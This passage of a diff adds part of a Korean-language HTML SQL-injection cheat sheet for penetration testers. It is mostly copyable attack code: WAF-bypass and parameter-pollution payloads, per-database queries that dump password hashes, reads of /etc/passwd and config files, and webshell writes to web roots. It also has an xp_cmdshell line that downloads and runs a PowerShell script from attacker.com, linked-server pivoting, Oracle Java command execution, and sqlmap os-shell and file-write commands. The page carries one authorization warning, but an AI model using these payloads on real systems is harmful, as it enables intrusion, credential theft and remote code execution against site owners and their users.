+        <button class="copy-btn" onclick="copyCode(this)">복사</button>
+        <pre><code class="language-json">// JSON 연산자 우회 — OR 1=1 없이 항상 참 만들기
+{"id": "1 AND JSON_EXTRACT('{\"a\":1}','$.a')=1"}
+
+// PostgreSQL JSON 포함 연산자
+{"id": "1 AND '{\"a\":1}'::jsonb @> '{\"a\":1}'::jsonb"}</code></pre>
+      </div>
+    </div>
+
+    <div class="sub-section">
+      <div class="sub-title">12.6 HTTP Parameter Pollution (HPP)</div>
+      <div class="code-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">복사</button>
+        <pre><code class="language-http">GET /items?id=1&id=1' OR '1'='1 HTTP/1.1
+Host: target.com
+
+-- 원리: WAF는 특정 위치(주로 첫 번째)의 값만 검사하는데, 백엔드 프레임워크는
+--       다른 위치의 값을 실제 쿼리에 사용하는 경우가 있어 그 불일치를 악용
+
+-- 프레임워크별 동일 이름 파라미터 처리 방식이 달라 직접 확인 필요:
+--   PHP $_GET             : 마지막 값 사용
+--   ASP.NET Request.QueryString : 모든 값을 콤마로 이어붙임 → id=1,1' OR '1'='1
+--   Node.js/Express (qs)  : 배열로 전달됨 (별도 파싱 로직 필요)
+
+-- 페이로드를 앞/뒤에 각각 배치해 어느 값이 실제로 쿼리에 들어가는지 테스트
+?id=1' OR '1'='1&id=1
+?id=1&id=1' OR '1'='1</code></pre>
+      </div>
+    </div>
+
+    <div class="sub-section">
+      <div class="sub-title">12.7 information_schema 자체가 차단/필터링될 때 (MySQL)</div>
+      <div class="section-desc" style="margin-bottom:12px;">
+        WAF나 필터가 <code>information_schema</code> 문자열 자체를 키워드로 차단하는 경우 사용할 수 있는 대안 소스.
+      </div>
+      <div class="code-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">복사</button>
+        <pre><code class="language-sql">-- information_schema.tables 대안 — InnoDB 테이블 통계 뷰 (스키마명+테이블명 포함, MySQL 5.6+)
+SELECT table_name FROM mysql.innodb_table_stats
+SELECT database_name, table_name FROM mysql.innodb_table_stats
+
+-- @@version 자체가 필터링될 때 대안
+SELECT @@innodb_version
+
+-- GROUP_CONCAT()이 필터링될 때 대안 (MySQL 5.7.22+, JSON 함수로 여러 행 결합)
+SELECT JSON_ARRAYAGG(username) FROM users
+SELECT JSON_OBJECTAGG(username,password) FROM users</code></pre>
+      </div>
+      <div class="info-box">
+        <span class="box-icon">ℹ</span>
+        <div><code>mysql.innodb_table_stats</code>는 SELECT 권한이 있는 계정이면 접근 가능한 경우가 많으나, 통계가 갱신되지 않은 신규 테이블은 누락될 수 있음.</div>
+      </div>
+    </div>
+  </section>
+
+  <div class="section-divider"></div>
+
+  <!-- ============================================================
+       13. DB별 열거 레퍼런스
+       ============================================================ -->
+  <section class="section-block" id="s-mysql">
+    <div class="section-header">
+      <span class="section-num">13a</span>
+      <h2 class="section-title">MySQL — 열거 레퍼런스</h2>
+      <span class="section-badge badge-orange">pentestmonkey</span>
+    </div>
+    <div class="code-wrap">
+      <button class="copy-btn" onclick="copyCode(this)">복사</button>
+      <pre><code class="language-sql">-- ── 버전/환경 정보 ──
+SELECT @@version
+SELECT version()
+SELECT @@hostname
+SELECT @@datadir         -- 데이터 디렉토리 경로
+
+-- ── 사용자 정보 ──
+SELECT user()
+SELECT system_user()
+SELECT current_user()
+
+-- ── DB 목록 ──
+SELECT schema_name FROM information_schema.schemata
+
+-- ── 테이블 목록 (시스템 DB 제외) ──
+SELECT table_schema, table_name FROM information_schema.tables
+  WHERE table_schema NOT IN ('mysql','information_schema','performance_schema','sys')
+
+-- ── 특정 DB 테이블 ──
+SELECT table_name FROM information_schema.tables WHERE table_schema=database()
+
+-- ── 컬럼 이름으로 테이블 역추적 ──
+SELECT table_schema, table_name FROM information_schema.columns WHERE column_name='password'
+SELECT table_schema, table_name FROM information_schema.columns WHERE column_name LIKE '%pass%'
+
+-- ── 전체 컬럼 목록 ──
+SELECT table_schema, table_name, column_name FROM information_schema.columns
+
+-- ── MySQL 사용자 목록 (priv) ──
+SELECT user FROM mysql.user
+SELECT host, user, authentication_string FROM mysql.user  -- MySQL 5.7+
+
+-- ── 비밀번호 해시 (priv) ──
+SELECT host, user, password FROM mysql.user  -- MySQL 5.6 이하
+SELECT host, user, authentication_string FROM mysql.user  -- MySQL 5.7+
+
+-- ── DBA 계정 확인 (priv) ──
+SELECT grantee, privilege_type FROM information_schema.user_privileges WHERE privilege_type='SUPER'
+SELECT user FROM mysql.user WHERE Super_priv='Y'
+
+-- ── N번째 행 가져오기 ──
+SELECT host,user FROM mysql.user ORDER BY host LIMIT 1 OFFSET 0  -- 0번째
+SELECT host,user FROM mysql.user ORDER BY host LIMIT 1 OFFSET 1  -- 1번째
+
+-- ── 유용한 함수 ──
+SELECT ascii('A')               -- 65 (문자→ASCII)
+SELECT char(65)                 -- 'A' (ASCII→문자)
+SELECT CONCAT('A','B')          -- 'AB'
+SELECT GROUP_CONCAT(col SEPARATOR ',') FROM t   -- 여러 행을 한 줄로
+
+-- ── 따옴표 없이 문자열 ──
+SELECT 0x414243   -- 'ABC'
+
+-- ── 조건문 ──
+SELECT IF(1=1,'true','false')
+SELECT CASE WHEN 1=1 THEN 'true' ELSE 'false' END</code></pre>
+    </div>
+  </section>
+
+  <section class="section-block" id="s-mssql">
+    <div class="section-header">
+      <span class="section-num">13b</span>
+      <h2 class="section-title">MSSQL — 열거 레퍼런스</h2>
+      <span class="section-badge badge-blue">pentestmonkey</span>
+    </div>
+    <div class="code-wrap">
+      <button class="copy-btn" onclick="copyCode(this)">복사</button>
+      <pre><code class="language-sql">-- ── 버전/환경 정보 ──
+SELECT @@version
+SELECT @@servername
+SELECT HOST_NAME()
+SELECT DB_NAME()
+
+-- ── 사용자 정보 ──
+SELECT user_name()
+SELECT system_user
+SELECT loginame FROM master..sysprocesses WHERE spid=@@SPID
+
+-- ── DB 목록 ──
+SELECT name FROM master..sysdatabases
+SELECT DB_NAME(N)   -- N = 0,1,2... 순서로 DB 이름 열거
+
+-- ── 테이블 목록 ──
+SELECT name FROM master..sysobjects WHERE xtype='U'   -- 테이블
+SELECT name FROM master..sysobjects WHERE xtype='V'   -- 뷰
+SELECT table_name FROM information_schema.tables       -- 현재 DB
+
+-- ── 컬럼 목록 ──
+SELECT name FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')
+SELECT column_name FROM information_schema.columns WHERE table_name='users'
+
+-- ── 컬럼 이름으로 테이블 역추적 ──
+SELECT sysobjects.name AS tablename, syscolumns.name AS columnname
+  FROM sysobjects JOIN syscolumns ON sysobjects.id=syscolumns.id
+  WHERE sysobjects.xtype='U' AND syscolumns.name LIKE '%password%'
+
+-- ── 로그인 사용자 목록 (priv) ──
+SELECT name FROM master..syslogins
+
+-- ── 비밀번호 해시 (priv) ──
+SELECT name, password_hash FROM master.sys.sql_logins
+SELECT name+'-'+master.sys.fn_varbintohexstr(password_hash) FROM master.sys.sql_logins
+
+-- ── DBA 계정 확인 (priv) ──
+SELECT is_srvrolemember('sysadmin')      -- 1이면 DBA
+SELECT name FROM master..syslogins WHERE sysadmin='1'
+
+-- ── N번째 행 ──
+SELECT TOP 1 name FROM (SELECT TOP 2 name FROM master..syslogins ORDER BY name ASC) sq ORDER BY name DESC
+
+-- ── 유용한 함수 ──
+SELECT ascii('A')           -- 65
+SELECT char(0x41)           -- 'A'
+SELECT 'A'+'B'              -- 'AB' (문자열 연결)
+SELECT LEN('test')          -- 4 (문자열 길이)
+SELECT SUBSTRING('test',1,1)  -- 't'
+
+-- ── 조건문 ──
+IF (1=1) SELECT 'true' ELSE SELECT 'false'
+SELECT CASE WHEN 1=1 THEN 'true' ELSE 'false' END</code></pre>
+    </div>
+  </section>
+
+  <section class="section-block" id="s-pgsql">
+    <div class="section-header">
+      <span class="section-num">13c</span>
+      <h2 class="section-title">PostgreSQL — 열거 레퍼런스</h2>
+      <span class="section-badge badge-cyan">pentestmonkey</span>
+    </div>
+    <div class="code-wrap">
+      <button class="copy-btn" onclick="copyCode(this)">복사</button>
+      <pre><code class="language-sql">-- ── 버전/환경 정보 ──
+SELECT version()
+SELECT inet_server_addr()   -- 서버 IP
+SELECT inet_server_port()   -- 서버 포트
+
+-- ── 사용자 정보 ──
+SELECT user
+SELECT current_user
+SELECT session_user
+SELECT usename FROM pg_user
+
+-- ── DB 목록 ──
+SELECT datname FROM pg_database
+
+-- ── 테이블 목록 (public 스키마) ──
+SELECT c.relname FROM pg_catalog.pg_class c
+  LEFT JOIN pg_catalog.pg_namespace n ON n.oid=c.relnamespace
+  WHERE c.relkind IN ('r','') AND n.nspname='public'
+  AND pg_catalog.pg_table_is_visible(c.oid)
+
+-- ── 컬럼 목록 ──
+SELECT relname, A.attname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T
+  WHERE (C.relkind='r') AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid)
+  AND (A.atttypid=T.oid) AND (A.attnum>0) AND (NOT A.attisdropped)
+  AND (N.nspname ILIKE 'public')
+
+-- ── 컬럼 이름으로 테이블 역추적 ──
+SELECT DISTINCT relname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T
+  WHERE (C.relkind='r') AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid)
+  AND (A.atttypid=T.oid) AND (A.attnum>0) AND (NOT A.attisdropped)
+  AND (N.nspname ILIKE 'public') AND attname LIKE '%password%'
+
+-- ── 사용자 목록 ──
+SELECT usename FROM pg_user
+SELECT usename, usecreatedb, usesuper, usecatupd FROM pg_user
+
+-- ── 비밀번호 해시 (superuser 필요) ──
+SELECT usename, passwd FROM pg_shadow
+
+-- ── DBA 계정 확인 ──
+SELECT usename FROM pg_user WHERE usesuper IS TRUE
+
+-- ── N번째 행 ──
+SELECT usename FROM pg_user ORDER BY usename LIMIT 1 OFFSET 0
+SELECT usename FROM pg_user ORDER BY usename LIMIT 1 OFFSET 1
+
+-- ── 유용한 함수 ──
+SELECT ascii('A')                  -- 65
+SELECT chr(65)                     -- 'A'
+SELECT 'A'||'B'                    -- 'AB' (문자열 연결)
+SELECT length('test')              -- 4
+SELECT substring('test',1,1)       -- 't'
+
+-- ── 조건문 ──
+SELECT CASE WHEN 1=1 THEN 'true' ELSE 'false' END</code></pre>
+    </div>
+  </section>
+
+  <section class="section-block" id="s-oracle">
+    <div class="section-header">
+      <span class="section-num">13d</span>
+      <h2 class="section-title">Oracle — 열거 레퍼런스</h2>
+      <span class="section-badge badge-red">pentestmonkey</span>
+    </div>
+    <div class="code-wrap">
+      <button class="copy-btn" onclick="copyCode(this)">복사</button>
+      <pre><code class="language-sql">-- ⚠️ Oracle은 SELECT에 FROM 절이 필수. FROM dual 사용
+
+-- ── 버전/환경 정보 ──
+SELECT banner FROM v$version WHERE ROWNUM=1
+SELECT version FROM v$instance
+
+-- ── 사용자 정보 ──
+SELECT user FROM dual
+SELECT SYS_CONTEXT('USERENV','CURRENT_USER') FROM dual
+
+-- ── DB 이름 ──
+SELECT name FROM v$database
+SELECT global_name FROM global_name
+
+-- ── 테이블 목록 ──
+SELECT table_name FROM all_tables          -- 접근 가능한 모든 테이블
+SELECT table_name FROM user_tables         -- 현재 사용자 소유 테이블
+
+-- ── 컬럼 목록 ──
+SELECT column_name FROM all_tab_columns WHERE table_name='USERS'
+
+-- ── 사용자 목록 ──
+SELECT username FROM all_users
+SELECT username FROM dba_users             -- DBA 권한 필요
+
+-- ── N번째 행 (ROWNUM 사용) ──
+SELECT username FROM all_users WHERE ROWNUM=1
+
+-- ── 유용한 함수 ──
+SELECT ascii('A') FROM dual               -- 65
+SELECT chr(65) FROM dual                  -- 'A'
+SELECT 'A'||'B' FROM dual                -- 'AB'
+SELECT length('test') FROM dual          -- 4
+SELECT substr('test',1,1) FROM dual      -- 't'
+
+-- ── 조건문 ──
+SELECT CASE WHEN 1=1 THEN 'true' ELSE 'false' END FROM dual
+
+-- ── 시스템 DB (메타데이터) ──
+-- dual, v$version, v$instance, v$database, all_tables, all_tab_columns, all_users</code></pre>
+    </div>
+  </section>
+
+  <div class="section-divider"></div>
+
+  <!-- ============================================================
+       14. 파일 읽기/쓰기 & OS 명령 실행
+       ============================================================ -->
+  <section class="section-block" id="s-file">
+    <div class="section-header">
+      <span class="section-num">14</span>
+      <h2 class="section-title">파일 읽기/쓰기 &amp; OS 명령 실행</h2>
+      <span class="section-badge badge-red">고급 (priv)</span>
+    </div>
+
+    <div class="danger-box">
+      <span class="box-icon">🔴</span>
+      <div>이 기법들은 <strong>DBA/FILE/SUPER 권한</strong>이 필요하며, 명시적으로 허가된 모의해킹 범위 내에서만 사용 가능합니다.
+      실제 시스템 손상 유발 가능 — 반드시 스냅샷/백업 확인 후 진행.</div>
+    </div>
+
+    <div class="sub-section">
+      <div class="sub-title">14.1 파일 읽기</div>
+      <div class="code-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">복사</button>
+        <pre><code class="language-sql">-- MySQL (FILE 권한 필요, 서버가 읽을 수 있는 파일만)
+SELECT LOAD_FILE('/etc/passwd')
+' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--
+' UNION SELECT LOAD_FILE('/var/www/html/config.php'),NULL--
+' UNION SELECT LOAD_FILE('/etc/mysql/my.cnf'),NULL--
+
+-- PostgreSQL (DBA 권한 필요)
+CREATE TABLE file_read(line text);
+COPY file_read FROM '/etc/passwd';
+SELECT line FROM file_read;
+DROP TABLE file_read;
+
+-- PostgreSQL — COPY가 막혀 있을 때 대안: Large Object (superuser 필요)
+SELECT lo_import('/etc/passwd');              -- OID 반환 (예: 16400)
+SELECT lo_get(16400);                          -- PostgreSQL 9.4+ 직접 조회
+-- 9.3 이하: lo_export로 서버가 접근 가능한 경로에 다시 써서 확인
+SELECT lo_export(16400,'/tmp/passwd_copy');
+
+-- MSSQL (BULKADMIN 권한 필요)
+CREATE TABLE file_read(line varchar(8000));
+BULK INSERT file_read FROM 'c:\windows\win.ini';
+SELECT line FROM file_read;
+DROP TABLE file_read;
+
+-- MSSQL — BULK INSERT가 막혀 있을 때 대안 (OPENROWSET, ad hoc distributed queries 활성화 필요)
+SELECT * FROM OPENROWSET(BULK 'c:\windows\win.ini', SINGLE_CLOB) AS f</code></pre>
+      </div>
+    </div>
+
+    <div class="sub-section">
+      <div class="sub-title">14.2 웹쉘 업로드 (파일 쓰기)</div>
+      <div class="code-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">복사</button>
+        <pre><code class="language-sql">-- MySQL (INTO OUTFILE, 웹루트 쓰기 권한 필요)
+SELECT '&lt;?php system($_GET["cmd"]); ?&gt;' INTO OUTFILE '/var/www/html/shell.php'
+
+-- 웹쉘 경로 추측 (LOAD_FILE으로 /etc/apache2/sites-enabled/* 확인)
+SELECT LOAD_FILE('/etc/apache2/sites-enabled/000-default.conf')
+
+-- PostgreSQL (DBA 권한 필요)
+CREATE TABLE webshell(cmd text);
+INSERT INTO webshell VALUES('&lt;?php system($_GET[cmd]); ?&gt;');
+COPY webshell(cmd) TO '/var/www/html/shell.php';
+DROP TABLE webshell;
+
+-- PostgreSQL — COPY TO가 막혀 있을 때 대안: Large Object로 파일 쓰기
+SELECT lo_from_bytea(0, decode('3c3f7068702073797374656d28245f4745545b22636d6422 5d293b203f3e','hex'));  -- 웹쉘 바이트를 LO로 생성
+SELECT lo_export(&lt;OID&gt;, '/var/www/html/shell.php');  -- 위에서 반환된 OID 사용
+
+-- MSSQL — xp_cmdshell + PowerShell로 파일 다운로드
+EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://attacker.com/shell.ps1'')"'</code></pre>
+      </div>
+    </div>
+
+    <div class="sub-section">
+      <div class="sub-title">14.3 MSSQL — 링크서버(Linked Server) 악용</div>
+      <div class="section-desc" style="margin-bottom:12px;">
+        조직 내부에서 DB 서버끼리 신뢰 관계(Linked Server)로 연결된 경우, 인젝션이 발생한 서버를 발판 삼아
+        <strong>직접 접근 불가능한 내부망 DB 서버</strong>까지 쿼리/명령 실행이 가능하다. 대규모 내부망 침투 시 핵심 기법.
+      </div>
+      <div class="code-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">복사</button>
+        <pre><code class="language-sql">-- 1단계: 연결된(신뢰) 서버 목록 확인
+SELECT srvname, srvproduct, providername FROM master..sysservers
+
+-- 2단계: OPENQUERY로 링크서버에 원격 쿼리 실행
+SELECT * FROM OPENQUERY([LINKED_SERVER_NAME], 'SELECT @@version')
+SELECT * FROM OPENQUERY([LINKED_SERVER_NAME], 'SELECT name FROM master..syslogins')
+
+-- 3단계: 링크서버 체이닝 — 격리된 내부망 서버까지 순차 접근
+SELECT * FROM OPENQUERY([LINKED_SERVER_NAME], 'SELECT * FROM OPENQUERY([INTERNAL_SERVER], ''SELECT @@version'')')
+
+-- 4단계: 링크서버 대상 원격 명령 실행 (xp_cmdshell이 원격 서버에서 활성화된 경우)
+EXEC ('master..xp_cmdshell ''whoami''') AT [LINKED_SERVER_NAME]
+
+-- SQLi 페이로드 예시
+1'; SELECT * FROM OPENQUERY([LINKED_SERVER_NAME], 'SELECT password FROM users')--</code></pre>
+      </div>
+      <div class="info-box">
+        <span class="box-icon">ℹ</span>
+        <div>링크서버는 대부분 <code>sa</code> 등 고권한 계정으로 연결을 저장해두는 경우가 많아, 현재 서버에서는 낮은 권한이어도 링크서버 쪽에서는 관리자 권한으로 동작하는 경우가 흔하다.</div>
+      </div>
+    </div>
+
+    <div class="sub-section">
+      <div class="sub-title">14.4 Oracle — Java 저장 프로시저 명령 실행 (10g/11g, 레거시/CTF 위주)</div>
+      <div class="section-desc" style="margin-bottom:12px;">
+        Oracle은 UTL_HTTP/UTL_INADDR(OOB)와 별개로 <strong>Java 저장 프로시저를 통한 직접 OS 명령 실행</strong> 경로가 존재하지만,
+        아래 기법은 10g/11g 시절 PUBLIC이 관련 패키지에 EXECUTE 권한을 가지고 있던 설정 취약점을 이용한 것 — 사실상 <strong>레거시/CTF용</strong>이며 실서비스에서 마주칠 확률은 낮다.
+      </div>
+      <div class="code-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">복사</button>
+        <pre><code class="language-sql">-- 사전 확인: 현재 계정이 DBMS_JAVA_TEST/DBMS_JAVA 관련 실행 권한을 가지고 있는지
+SELECT * FROM session_privs WHERE privilege LIKE '%JAVA%'
+SELECT * FROM user_tab_privs WHERE table_name IN ('DBMS_JAVA_TEST','DBMS_JAVA') AND privilege='EXECUTE'
+
+-- Oracle 10gR2/11gR1/11gR2 — DBMS_JAVA_TEST.FUNCALL로 OS 명령 실행 (내장 Wrapper 클래스 사용)
+SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','/bin/sh','-c','id > /tmp/out') FROM dual
+
+-- 동일 대상 — DBMS_JAVA.RUNJAVA (클래스/메소드/인자를 공백으로 이어붙인 문자열 하나로 전달)
+SELECT DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper main /bin/sh -c id') FROM dual</code></pre>
+      </div>
+      <div class="danger-box">
+        <span class="box-icon">🔴</span>
+        <div>Oracle 공식 하드닝 가이드 자체가 "PUBLIC의 DBMS_JAVA_TEST/DBMS_JAVA EXECUTE 권한 회수"를 권고 사항으로 명시하고 있어, 패치가 적용된 11g 이상이나 12c+에서는 대부분 막혀 있다.
+        실전에서는 <code>session_privs</code>로 권한부터 확인하고, 안 되면 4번(UNION)·6번(Blind)·8.4(OOB)로 전환할 것.</div>
+      </div>
+    </div>
+  </section>
+
+  <div class="section-divider"></div>
+
+  <!-- ============================================================
+       15. sqlmap 기초
+       ============================================================ -->
+  <section class="section-block" id="s-sqlmap">
+    <div class="section-header">
+      <span class="section-num">15</span>
+      <h2 class="section-title">sqlmap 기초</h2>
+      <span class="section-badge badge-cyan">자동화</span>
+    </div>
+    <div class="section-desc">
+      Boolean/Time-Based Blind를 수동으로 하기에 너무 오래 걸릴 때 sqlmap으로 자동화.
+      Burp Suite 요청 파일과 연동하면 쿠키/헤더도 손쉽게 테스트 가능.
+    </div>
+
+    <div class="sub-section">
+      <div class="sub-title">15.1 기본 사용법</div>
+      <div class="code-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">복사</button>
+        <pre><code class="language-bash"># GET 파라미터
+sqlmap -u "http://target.com/items?id=1"
+
+# POST 파라미터
+sqlmap -u "http://target.com/login" --data="username=test&password=test"
+
+# 특정 파라미터만 테스트 (-p)
+sqlmap -u "http://target.com/items?id=1&page=2" -p id
+
+# Cookie 파라미터
+sqlmap -u "http://target.com/" --cookie="session=abc123"
+
+# HTTP 헤더 주입
+sqlmap -u "http://target.com/" --headers="X-Forwarded-For: *"
+
+# 인증 필요 페이지 (쿠키 포함)
+sqlmap -u "http://target.com/profile?id=1" --cookie="PHPSESSID=xxx; security=low"
+
+# Burp Suite로 저장한 요청 파일 사용 (가장 간편)
+sqlmap -r request.txt
+sqlmap -r request.txt -p id    # 파라미터 지정</code></pre>
+      </div>
+    </div>
+
+    <div class="sub-section">
+      <div class="sub-title">15.2 DB 열거</div>
+      <div class="code-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">복사</button>
+        <pre><code class="language-bash"># DB 목록
+sqlmap -u "http://target.com/?id=1" --dbs
+
+# 테이블 목록
+sqlmap -u "http://target.com/?id=1" -D database_name --tables
+
+# 컬럼 목록
+sqlmap -u "http://target.com/?id=1" -D database_name -T table_name --columns
+
+# 데이터 덤프
+sqlmap -u "http://target.com/?id=1" -D database_name -T users --dump
+
+# 전체 DB 덤프 (시간 오래 걸림)
+sqlmap -u "http://target.com/?id=1" --dump-all
+
+# 특정 컬럼만 덤프
+sqlmap -u "http://target.com/?id=1" -D db -T users -C username,password --dump</code></pre>
+      </div>
+    </div>
+
+    <div class="sub-section">
+      <div class="sub-title">15.3 고급 옵션</div>
+      <div class="code-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">복사</button>
+        <pre><code class="language-bash"># 주입 기법 지정
+# B=Boolean E=Error U=Union S=Stacked T=Time Q=Inline Query
+sqlmap -u "http://target.com/?id=1" --technique=BEUSTQ
+
+# 위험도/레벨 높이기 (더 많은 페이로드, 더 공격적)
+sqlmap -u "http://target.com/?id=1" --level=5 --risk=3
+
+# WAF 우회 tamper 스크립트
+sqlmap -u "http://target.com/?id=1" --tamper=space2comment
+sqlmap -u "http://target.com/?id=1" --tamper=between,randomcase,space2comment
+
+# 자주 쓰는 tamper 목록:
+# space2comment  : 공백을 /**/로 대체
+# between        : > 비교를 BETWEEN으로 대체
+# randomcase     : 대소문자 랜덤 혼용
+# charencode     : URL 인코딩
+# base64encode   : base64 인코딩
+# equaltolike    : = 를 LIKE로 대체
+
+# DBMS 지정 (속도 향상)
+sqlmap -u "http://target.com/?id=1" --dbms=mysql
+
+# Burp Suite 프록시 통과 (분석용)
+sqlmap -u "http://target.com/?id=1" --proxy="http://127.0.0.1:8080"
+
+# OS 명령 실행 (DBA 권한 필요)
+sqlmap -u "http://target.com/?id=1" --os-cmd="id"
+sqlmap -u "http://target.com/?id=1" --os-shell
+
+# 파일 읽기
+sqlmap -u "http://target.com/?id=1" --file-read="/etc/passwd"
+
+# 파일 쓰기
+sqlmap -u "http://target.com/?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
+
+# 속도 제한 (서버 부하 줄이기)
+sqlmap -u "http://target.com/?id=1" --delay=1 --timeout=30 --threads=1
+
+# 자동 응답 (대화형 질문 자동 수락)
+sqlmap -u "http://target.com/?id=1" --batch</code></pre>
+      </div>
+    </div>
+
+    <div class="sub-section">
+      <div class="sub-title">15.4 Burp Suite + sqlmap 연동 방법</div>
+      <div class="code-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">복사</button>
+        <pre><code class="language-text">1. Burp Suite HTTP history에서 대상 요청 우클릭
+2. "Copy to file" → request.txt 저장
+   (또는 "Save item" → raw HTTP 파일)
+
+3. sqlmap 실행:
+   sqlmap -r request.txt              -- 자동으로 모든 파라미터 테스트
+   sqlmap -r request.txt -p id        -- id 파라미터만 테스트
+   sqlmap -r request.txt --dbs        -- DB 목록 바로 열거
+
+# request.txt 예시 내용:
+GET /items?id=1 HTTP/1.1
+Host: target.com
+Cookie: PHPSESSID=abc123; security=low
+User-Agent: Mozilla/5.0
+...</code></pre>
+      </div>
+    </div>
+
+    <div class="sub-section">
+      <div class="sub-title">15.5 sqlmap이 기본 옵션으로 안 잡힐 때 — 실전 튜닝</div>
+      <div class="section-desc" style="margin-bottom:12px;">
+        "sqlmap 돌렸는데 취약점이 없다고 나온다"는 실전에서 가장 흔한 오판이다. 대부분 아래 옵션 중 하나가 원인이다. 이 튜닝 감각이 초급과 실무자를 가르는 지점.
+      </div>
+      <div class="code-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">복사</button>
+        <pre><code class="language-bash"># ① Boolean Blind 판별 기준이 애매해서 실패하는 경우 → 참/거짓 기준을 직접 지정
+sqlmap -u "http://target.com/?id=1" --string="Welcome"      # 이 문자열이 있으면 참으로 간주
+sqlmap -u "http://target.com/?id=1" --not-string="Error"    # 이 문자열이 있으면 거짓으로 간주
+sqlmap -u "http://target.com/?id=1" --code=200               # HTTP 상태코드로 참/거짓 판별
+
+# ② Second-Order SQLi — 페이로드를 넣는 곳과 결과를 확인하는 곳이 다를 때 (11번 섹션)
+sqlmap -u "http://target.com/register" --data="username=test&pass=test" --second-url="http://target.com/profile"
+
+# ③ 자동 탐지가 컨텍스트를 잘못 짚을 때 — 페이로드 앞뒤를 직접 지정
+#    (예: 파라미터가 이미 괄호 2개 안에 들어가는 구조라 자동 tamper로는 못 뚫을 때)
+sqlmap -u "http://target.com/?id=1" --prefix="))" --suffix="-- -"
+
+# ④ CSRF 토큰이 있는 로그인/폼 — 토큰 파라미터명을 지정하면 매 요청마다 자동으로 새로 받아옴
+sqlmap -u "http://target.com/login" --data="user=a&pass=b&csrf=x" --csrf-token="csrf"
+
+# ⑤ WAF가 sqlmap 시그니처(User-Agent, 특정 패턴)를 차단할 때
+sqlmap -u "http://target.com/?id=1" --identify-waf                              # 먼저 WAF 종류 확인 (12.0 참고)
+sqlmap -u "http://target.com/?id=1" --random-agent --tamper=space2comment,between,randomcase
+
+# ⑥ 커스텀 tamper 스크립트 — 기존 tamper 조합으로도 안 뚫릴 때 직접 작성
+#    ~/.local/share/sqlmap/tamper/mytamper.py 에 dependencies()/tamper(payload, **kwargs) 구현 후:
+sqlmap -u "http://target.com/?id=1" --tamper=mytamper
+
+# ⑦ 세션/타이밍 꼬임으로 재현이 안 될 때 — 캐시 초기화 + 매 요청 새 페이로드
+sqlmap -u "http://target.com/?id=1" --flush-session --fresh-queries
+
+# ⑧ Time-Based가 네트워크 지연 때문에 오탐될 때 — 임계값(초) 직접 조정
+sqlmap -u "http://target.com/?id=1" --technique=T --time-sec=10</code></pre>
+      </div>
+      <div class="tip-box">
+        <span class="box-icon">💡</span>
+        ①②는 정확도 문제, ③④는 요청 구조 문제, ⑤⑥은 WAF 문제, ⑦⑧은 안정성 문제 — sqlmap이 실패하면 이 네 범주 중 어디에 해당하는지부터 구분하는 것이 디버깅의 핵심.
+      </div>
+    </div>
+  </section>
+
+  <div class="section-divider"></div>
+
+  <!-- ============================================================
+       16. 공격 흐름 결정 다이어그램
+       ============================================================ -->
+  <section class="section-block" id="s-flow">
+    <div class="section-header">
+      <span class="section-num">16</span>
+      <h2 class="section-title">공격 흐름 결정 다이어그램</h2>
+      <span class="section-badge badge-gray">요약</span>
+    </div>
+
+    <div class="code-wrap">
+      <button class="copy-btn" onclick="copyCode(this)">복사</button>
+      <pre><code class="language-text">[ 입력 포인트 식별 ]
+  GET/POST 파라미터 / Cookie / HTTP 헤더 / JSON 바디 / XML 바디 / URL 경로
+  ↓
+[ 취약점 확인 — ' 삽입 후 반응 확인 ]
+  ↓
+[ 화면에 결과가 직접 출력됨? ]
+  ├─ YES → 【UNION-Based SQLi】
+  │         ORDER BY N → UNION SELECT NULL → 출력 위치 확인 → 데이터 추출
+  │         정보: database() / information_schema / CONCAT
+  └─ NO  ↓
+[ 에러 메시지 내용이 보임? ]
+  ├─ YES → 【Error-Based SQLi】
+  │         MySQL:      extractvalue(rand(),concat(0x3a,[쿼리]))
+  │         PostgreSQL: CAST([쿼리] AS int)
+  │         MSSQL:      CONVERT(int,[쿼리])
+  └─ NO  ↓
+[ 성공/실패 반응이 다름? ]
+  ├─ YES → 【Boolean-Based Blind SQLi】
+  │         AND substring([쿼리],N,1)='c'  ← 한 글자씩 반복
+  │         실전: sqlmap 또는 자체 스크립트 자동화
+  └─ NO  ↓
+[ 응답 시간 차이 가능? ]
+  ├─ YES → 【Time-Based Blind SQLi】
+  │         MySQL:   IF([조건],SLEEP(5),0)
+  │         MSSQL:   IF([조건]) WAITFOR DELAY '0:0:5'
+  │         PgSQL:   CASE WHEN [조건] THEN pg_sleep(5) ELSE pg_sleep(0) END
+  └─ NO  ↓
+【Out-of-Band SQLi】
+  DNS/HTTP 외부 채널로 유출
+  도구: Burp Collaborator, interactsh</code></pre>
+    </div>
+
+    <div class="sub-section" style="margin-top:16px;">
+      <div class="sub-title">우선순위 요약표</div>
+      <table class="compare-table">
+        <thead>
+          <tr>
+            <th>우선순위</th><th>기법</th><th>핵심 연산자</th><th>속도</th><th>조건</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td class="pri">1</td>
+            <td class="tag-cyan">UNION-Based</td>
+            <td><code>UNION SELECT</code>, <code>ORDER BY</code></td>
+            <td class="tag-green">빠름</td>
+            <td>화면 출력 자리 존재</td>
+          </tr>
+          <tr>
+            <td class="pri">2</td>
+            <td class="tag-red">Error-Based</td>
+            <td><code>extractvalue</code>, <code>CAST</code>, <code>CONVERT</code></td>
+            <td class="tag-green">빠름</td>
